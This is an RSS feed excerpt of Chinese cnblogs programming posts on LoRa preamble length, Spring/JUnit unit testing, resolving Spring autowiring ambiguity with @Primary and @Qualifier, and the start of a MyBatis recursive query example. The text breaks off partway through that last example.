<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>LoRa硬件调试-前导码 - AnswerInTheWind</title>
<link>http://www.cnblogs.com/answerinthewind/p/9434288.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/answerinthewind/p/9434288.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;已知LoRa数据包在负载之前会有一段前导码，接收端是先检测前导码，收到前导码之后才认为有数据发送过来。&lt;/p&gt;
&lt;p&gt;那么不同的前导码的长度会有什么影响呢？&lt;/p&gt;
&lt;h2 id=&quot;前导码长短的优劣势&quot;&gt;前导码长短的优劣势&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;- 前导码实际上是占符号的，也就是说越长的前导码，发送的持续时间也会越久，相应的也越耗电，所以较短的签到码就可以省点，反之则耗电，同样也会影响信道资源的占用
- 加入前导码持续的时间较长，设备可以休眠一段时间再醒来，照常可以收到数据，那么接收设备就更省电，同时兼顾实时性&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;举个例子&quot;&gt;举个例子&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;加入一个前导码持续100ms，设备每80ms醒来一次，检测有没有数据包发过来，此时，只要有数据下发，那么设备醒来就一定能检测到前导码，因为设备可以休眠，而无需一直开着接收模式等待数据下发。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;上述情况如何设置&quot;&gt;上述情况如何设置&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;需要设置接收节点的RX_preamble    大于发送设备的tx_preamble


因为接收设备的检测原理不是收购足够的前导码才表示收到了数据，而是收到了前导码就并且不超过设置的最大前导码数据就可以了&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 06 Aug 2018 15:45:00 +0000</pubDate>
<dc:creator>AnswerInTheWind</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/answerinthewind/p/9434288.html</dc:identifier>
</item>
<item>
<title>spring集成Junit做单元测试及常见异常解决办法 - 孤城孤刀</title>
<link>http://www.cnblogs.com/xyhero/p/9434252.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xyhero/p/9434252.html</guid>
<description>&lt;p&gt;spring-test依赖包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;Spring-test &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; https://mvnrepository.com/artifact/org.springframework/spring-test &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-test&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.3.7.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;1、简单单元测试&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.ssm.test; 

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Map;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.junit.Test;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.junit.runner.RunWith;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.context.ContextConfiguration;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.ssm.dao.UserMngDao;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt; 
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt; wangxiangyu
 * @date：2017年7月18日 下午2:24:50 
 * 类说明：Spring单元测试
 * 1、导入spring-test单元测试的jar包
 * 2、@ContextConfiguration(locations={&quot;classpath:applicationContext.xml&quot;})指定Spring配置文件的位置
 * 3、@RunWith(SpringJUnit4ClassRunner.class)使用Spring单元测试
 * 3、直接autowired要使用的组件
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RunWith(SpringJUnit4ClassRunner.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;)
@ContextConfiguration(locations&lt;/span&gt;={&quot;classpath:applicationContext.xml&quot;&lt;span&gt;})
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MapperTest {

    @Autowired
    UserMngDao userMngDao;
    
    @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; test1(){
        
        List&lt;/span&gt;&amp;lt;Map&amp;gt; users =&lt;span&gt; userMngDao.findAll();
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(Map user : users){
            String staffName &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;==user.get(&quot;staffName&quot;)?&quot;&quot;:user.get(&quot;staffName&quot;&lt;span&gt;).toString();
            System.out.println(staffName);
        }
        
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2、模拟前端请求单元测试&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.atguigu.crud.test;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.junit.Before;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.junit.Test;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.junit.runner.RunWith;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.mock.web.MockHttpServletRequest;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.context.ContextConfiguration;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.context.web.WebAppConfiguration;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.web.servlet.MockMvc;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.web.servlet.MvcResult;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.test.web.servlet.setup.MockMvcBuilders;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.context.WebApplicationContext;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.atguigu.crud.bean.Employee;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.github.pagehelper.PageInfo;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 使用Spring测试模块提供的测试请求功能，测试curd请求的正确性
 * Spring4测试的时候，需要servlet3.0的支持
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt; lfy
 * 
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RunWith(SpringJUnit4ClassRunner.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;)
@WebAppConfiguration
@ContextConfiguration(locations &lt;/span&gt;= { &quot;classpath:applicationContext.xml&quot;, &quot;file:src/main/webapp/WEB-INF/dispatcherServlet-servlet.xml&quot;&lt;span&gt; })
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MvcTest {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 传入Springmvc的ioc&lt;/span&gt;
&lt;span&gt;    @Autowired
    WebApplicationContext context;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 虚拟mvc请求，获取到处理结果。&lt;/span&gt;
&lt;span&gt;    MockMvc mockMvc;

    @Before
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; initMokcMvc() {
        mockMvc &lt;/span&gt;=&lt;span&gt; MockMvcBuilders.webAppContextSetup(context).build();
    }

    @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; testPage() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;模拟请求拿到返回值&lt;/span&gt;
        MvcResult result = mockMvc.perform(MockMvcRequestBuilders.get(&quot;/emps&quot;).param(&quot;pn&quot;, &quot;5&quot;&lt;span&gt;)).andReturn();
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;请求成功以后，请求域中会有pageInfo；我们可以取出pageInfo进行验证&lt;/span&gt;
        MockHttpServletRequest request =&lt;span&gt; result.getRequest();
        PageInfo pi &lt;/span&gt;= (PageInfo) request.getAttribute(&quot;pageInfo&quot;&lt;span&gt;);
        System.out.println(&lt;/span&gt;&quot;当前页码：&quot;+&lt;span&gt;pi.getPageNum());
        System.out.println(&lt;/span&gt;&quot;总页码：&quot;+&lt;span&gt;pi.getPages());
        System.out.println(&lt;/span&gt;&quot;总记录数：&quot;+&lt;span&gt;pi.getTotal());
        System.out.println(&lt;/span&gt;&quot;在页面需要连续显示的页码&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;[] nums =&lt;span&gt; pi.getNavigatepageNums();
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i : nums) {
            System.out.print(&lt;/span&gt;&quot; &quot;+&lt;span&gt;i);
        }
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取员工数据&lt;/span&gt;
        List&amp;lt;Employee&amp;gt; list =&lt;span&gt; pi.getList();
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Employee employee : list) {
            System.out.println(&lt;/span&gt;&quot;ID：&quot;+employee.getEmpId()+&quot;==&amp;gt;Name:&quot;+&lt;span&gt;employee.getEmpName());
        }
        
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3、Junit常见异常及解决办法&lt;/p&gt;
&lt;p&gt;异常：&lt;br/&gt;&lt;span&gt;java.lang.IllegalStateException: Failed to load ApplicationContext&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;解决方法：&lt;br/&gt;java1.8版本只支持spring4.0以上。所以解决方法有两种：1）把sping版本换成4.0以上；2）把jdk调低点。此处我选择把jdk调低点，再次运行。&lt;/p&gt;
&lt;p&gt;异常：&lt;br/&gt;&lt;span&gt;java.lang.NoClassDefFoundError: org/junit/runners/model/MultipleFailureException&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;解决方法：&lt;br/&gt;没有multipleFailureException类，可能是因为你的版本过低引起的，请更换最新版本。&lt;/p&gt;
&lt;p&gt;异常：&lt;br/&gt;&lt;span&gt;java.lang.Exception: No tests found matching [{ExactMatcher:fDisplayName=test_sayHello4]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;解决方法：&lt;br/&gt;Spring-test版本与junit版本不兼容导致的，可以多试几个版本。&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 15:35:00 +0000</pubDate>
<dc:creator>孤城孤刀</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xyhero/p/9434252.html</dc:identifier>
</item>
<item>
<title>Spring_总结_04_高级配置(三)之处理歧义 - shirayner</title>
<link>http://www.cnblogs.com/shirui/p/9427869.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/shirui/p/9427869.html</guid>
<description>&lt;h2&gt;一、前言&lt;/h2&gt;
&lt;p&gt;本文承接上一节：&lt;a id=&quot;homepage1_HomePageDays_DaysList_ctl00_DayList_TitleUrl_0&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/shirui/p/9427045.html&quot; target=&quot;_blank&quot;&gt;Spring_总结_04_高级配置(二)之条件注解@Conditional&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们前面装配bean时，在Spring容器中，都是只有一个bean能匹配所需的结果。&lt;/p&gt;
&lt;p&gt;如果有多个bean能匹配结果的话，Spring就将无法做出选择，这就是自动装配的歧义性。&lt;/p&gt;
&lt;p&gt;这一节我们将解决自动装配的歧义性&lt;/p&gt;

&lt;h2&gt;二、歧义实例&lt;/h2&gt;
&lt;h3&gt;1.实体类&lt;/h3&gt;
&lt;p&gt;如下，有三个类都继承自Dessert&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Cake &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Dessert {...}

@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Cookies &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Dessert {...}

@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; IceCream &lt;span&gt;implements&lt;/span&gt; Dessert {...}
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;2.注入bean&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDessert(Dessert dessert){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.dessert =&lt;span&gt; dessert;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;3.异常&lt;/h3&gt;
&lt;p&gt;Spring有选择困难症，当Spring尝试自动装配 setDessert() 中的 Dessert 参数时，发现有三个选择，这时它会抛出一个NoUniqueBeanDefinitionException异常，来表示自己无从选择。&lt;/p&gt;




&lt;h2&gt; &lt;/h2&gt;
&lt;p&gt;&lt;span&gt;可用 @Primary 和 @Qualifier 来解决歧义问题。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;三、@Primary&lt;/h2&gt;
&lt;p&gt; 在声明Bean的时候，通过将其中一个可选的bean设置为首选（primary）Bean，能够避免自动装配的歧义性。&lt;/p&gt;
&lt;p&gt;被@Primary注解的bean即可首选Bean。&lt;/p&gt;
&lt;h3&gt;1.配置首选Bean&lt;/h3&gt;
&lt;p&gt;配置首选Bean有如下两种方式：&lt;/p&gt;
&lt;p&gt;（1）在组件类中配合@Component使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Component
@Primary
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; IceCream &lt;span&gt;implements&lt;/span&gt; Dessert {...}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;（2）在配置类中配合@Bean使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Bean
@Primary
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Dessert iceCream(){
       &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IceCream();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;2.注入bean&lt;/h3&gt;
&lt;p&gt;注入bean时，Spring会找到三个可选bean，其中一个是首选bean，因此会选择首选bean进行注入。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDessert(Dessert dessert){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.dessert =&lt;span&gt; dessert;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意：Spring 有选择困难症，若配置了两个及以上的首选Bean，则Spring有无从选择了。&lt;/p&gt;

&lt;h2&gt;四、@Qualifier&lt;/h2&gt;
&lt;p&gt;Spring 的限定符能够将bean限定到唯一一个满足要求的bean.&lt;/p&gt;
&lt;h3&gt;1. 基于ID的限定符&lt;/h3&gt;
&lt;p&gt; 为@Qualifier注解所设置的参数就是想要注入的bean的 ID&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
@Qualifier(&lt;/span&gt;&quot;iceCream&quot;)      &lt;span&gt;//&lt;/span&gt;&lt;span&gt;在注入的时候，指定注入的bean为 iceCream&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDessert(Dessert dessert){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.dessert =&lt;span&gt; dessert;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. 面向特性的限定符&lt;/h3&gt;
&lt;p&gt;我们可以为bean设置自己的限定符，而不是依赖于将 bean ID 作为限定符。&lt;/p&gt;
&lt;p&gt;可在声明Bean或配置Bean时，使用@Qualifier注解设置限定符。&lt;/p&gt;
&lt;h4&gt;2.1 设置限定符&lt;/h4&gt;
&lt;p&gt;（1）在声明Bean时，设置限定符&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Component
@Qualifier(&lt;/span&gt;&quot;cold&quot;)     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置限定符为 cold&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; IceCream &lt;span&gt;implements&lt;/span&gt; Dessert {...}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;（2）在配置Bean时，设置限定符&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Bean
@Qualifier(&lt;/span&gt;&quot;cold&quot;)     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置限定符为 cold&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Dessert iceCream(){ 
     &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IceCream(); 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4&gt;2.2 使用限定符&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
@Qualifier(&lt;/span&gt;&quot;cold&quot;)   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;注入限定符为 cold 的bean&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDessert(Dessert dessert){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.dessert =&lt;span&gt; dessert;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3 自定义限定符注解&lt;/h3&gt;
&lt;p&gt;有时，我们想为bean设置多个限定符，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Component
@Qualifier(&lt;/span&gt;&quot;cold&quot;)       &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置限定符为 cold&lt;/span&gt;
@Qualifier(&quot;creamy&quot;)     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置限定符为 creamy&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Popsicle &lt;span&gt;implements&lt;/span&gt; Dessert {...}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然而，&lt;span&gt;Java不允许在同一个条目上重复出现相同类型的多个注解&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;为了解决这个问题，我们可以创建自定义的限定符注解。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）自定限定符注解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;@Cold&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Target({
        ElementType.TYPE,
        ElementType.CONSTRUCTOR,
        ElementType.FIELD,
        ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
@Qualifier
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; @&lt;span&gt;interface&lt;/span&gt; Cold{ }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;@Creamy&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Target({
        ElementType.TYPE,
        ElementType.CONSTRUCTOR,
        ElementType.FIELD,
        ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
@Qualifier
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; @&lt;span&gt;interface&lt;/span&gt; Creamy{ }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;（2）为bean设置多个限定符&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Component
@Cold
@Creamy 
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; IceCream &lt;span&gt;implements&lt;/span&gt; Dessert {...}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;（3）注入bean时，使用多个限定符来限定&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Autowired
@Cold
@Creamy
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDessert(Dessert dessert){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.dessert =&lt;span&gt; dessert;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Mon, 06 Aug 2018 15:06:00 +0000</pubDate>
<dc:creator>shirayner</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/shirui/p/9427869.html</dc:identifier>
</item>
<item>
<title>mybatis递归，一对多代码示例 - 陈灬大灬海</title>
<link>http://www.cnblogs.com/c-h-y/p/9434126.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/c-h-y/p/9434126.html</guid>
<description>&lt;p&gt;今天需要做一个功能，根据专业，有不同的章节，章节下面有对应的习题，&lt;/p&gt;
&lt;p&gt;由于只有这么两级，可以不用使用递归，直接查询父集，之后foreach查询子集放入对应的list集合。&lt;/p&gt;
&lt;p&gt;虽然实现了，感觉毕竟，太low。&lt;/p&gt;
&lt;p&gt;有同事跟我说可以使用mybatis的递归实现，就学习了下。&lt;/p&gt;
&lt;p&gt;对应的bean里面需要有对应的list&amp;lt;bean&amp;gt; lists的引用。&lt;/p&gt;
&lt;p&gt;直接上代码&lt;/p&gt;
&lt;p&gt;对应的sql语句&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;117&quot;&gt;
&lt;pre&gt;
&lt;span&gt;CREATE&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt; `goods_category` (
  `goodscateid` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;11&lt;/span&gt;) &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt; AUTO_INCREMENT,
  `name` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `parentid` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;11&lt;/span&gt;) &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `description` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `displayorder` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;11&lt;/span&gt;) &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `commissionrate` &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  `enabled` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;11&lt;/span&gt;) &lt;span&gt;DEFAULT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;PRIMARY&lt;/span&gt; &lt;span&gt;KEY&lt;/span&gt;&lt;span&gt; (`goodscateid`)
) ENGINE&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;InnoDB AUTO_INCREMENT&lt;span&gt;=&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;DEFAULT&lt;/span&gt; CHARSET&lt;span&gt;=&lt;/span&gt;&lt;span&gt;utf8;

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;Data for the table `goods_category` &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
